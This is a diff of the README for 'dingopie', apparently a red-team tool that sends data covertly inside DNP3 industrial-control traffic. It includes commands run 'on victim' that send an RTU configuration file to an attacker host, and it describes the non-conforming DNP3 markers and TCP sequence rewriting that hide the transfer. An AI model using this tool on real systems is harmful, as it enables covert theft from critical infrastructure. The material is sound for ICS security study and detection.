@@ -40,9 +40,9 @@ dingopie>
 #### Transfer a file over an existing DNP3 connection:
 ```bash
 # on victim
-$ dingopie server inject send -f /etc/sel/rtac-config.xml
-# on attacker
-$ dingopie client inject receive -f loot/rtu1-config.xml -j 192.168.0.5
+$ dingopie server inject send -f /tmp/garbage.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
+# on attacker or intermediary
+$ dingopie client inject receive -f ~/da-vinci-source.dat -k "hack the planet" -i 2.6.0.0 -p 20002 -j 31.33.7.95
 ```
 
 ## Usage
@@ -159,25 +159,31 @@ Title: Shell
 
 > Example [inject.pcapng.gz](.media/inject.pcapng.gz)
 
-In inject mode, dingopie is subordinate to the existing legitimate DNP3 channel. The rate and structure of the traffic will remain that of the legitimate channel, but the size of each packet will increase. Data is added to the end of DNP3 packets as they leave one host, and removed on the other side before allowing the packets to continue on to the legitimate DNP3 program. To mark the start of the data, dingopie constructs a DNP3 object that is non-protocol-conforming: Group 0, Variation 0, Qualifier `0xFX`, where `X` represents one of three reserved Range Specifier Codes `A`, `C`, or `D`. All data following an object with these characteristics, up to the end of the frame is a part of the covert channel. The sender and receiver can either intercept packets as they leave a device (i.e. running on anoutstation or master), or they can run on network infrastructure that carries DNP3 traffic. In the second case, dingopie inject can even multiplex its data transfer over many DNP3 connections to increase the throughput. Although in this instance, TCP out-of-order issues may impact reliability.
+In inject mode, dingopie is subordinate to the existing legitimate DNP3 channel. The rate and structure of the traffic will remain that of the legitimate channel, but the size of each packet will increase. Data is added to the end of DNP3 packets as they leave one host, and removed on the other side before allowing the packets to continue on to the legitimate DNP3 program. To mark the start of the data, dingopie constructs a DNP3 object that is non-protocol-conforming: Group 0, Variation 0, Qualifier `0xFX`, where `X` represents one of three reserved Range Specifier Codes `A`, `C`, or `D`. All data following an object with these characteristics, up to the end of the frame, is a part of the covert channel. The sender and receiver can either intercept packets as they leave a device (i.e. running on anoutstation or master), or they can run on network infrastructure that carries DNP3 traffic. In the second case, dingopie inject can even multiplex its data transfer over many DNP3 connections to increase the throughput, although out-of-order delivery may impact reliability. Both `server` and `client` modes use the same scheme to inject data into the TCP stream. The only difference is the direction of traffic flow: `client receive` / `server send` filters for traffic with TCP source port, while `client send` / `server receive` filters for traffic with TCP destination port.
+
+> [!WARNING]
+> In inject mode, the TCP Sequence/Acknowledgement numbers are modified to account for the additional data added by dingopie. Dingopie takes care of this for the length of the running session, but once dingopie exits a TCP 'hickup' **will** occur where the stream re-synchronizes. This is unavoidable unless a program is kept running indefinitely.
+
+> [!NOTE]
+> The diagram below shows the inject sequence transferring server --> client. The sequence is the same for client --> server, except dingopie would be filtering on traffic flowing in the opposite direction. 
 
 ```mermaid
 sequenceDiagram
 Title: Inject
-    participant o as outstation (legitimate DNP3 program)
-    participant s as server (dingopie server)
-    participant c as client (dingopie client)
-    participant m as master (legitimate DNP3 program)
+    participant o@{ "type" : "boundary" } as DNP3 Outstation
+    participant s as dingopie server
+    participant c as dingopie client
+    participant m@{ "type" : "control" } as DNP3 Master
 
     o -->>s: Legitimate Traffic
-    s->>c: SendSize (G0V0QFA)
+    s->>c: + SendSize (G0V0QFA)
     c-->>m: Legitimate Traffic
     Loop send data
         o-->>s: Legitimate Traffic
-        s->>c:  SendData (G0V0QFC)
+        s->>c:  + SendData (G0V0QFC)
         c-->>m: Legitimate Traffic
     end
     o -->>s: Legitimate Traffic
-    s->>c:   Disconnect (G0V0QFD)
+    s->>c:   + Disconnect (G0V0QFD)
     c-->>m:  Legitimate Traffic
 ```
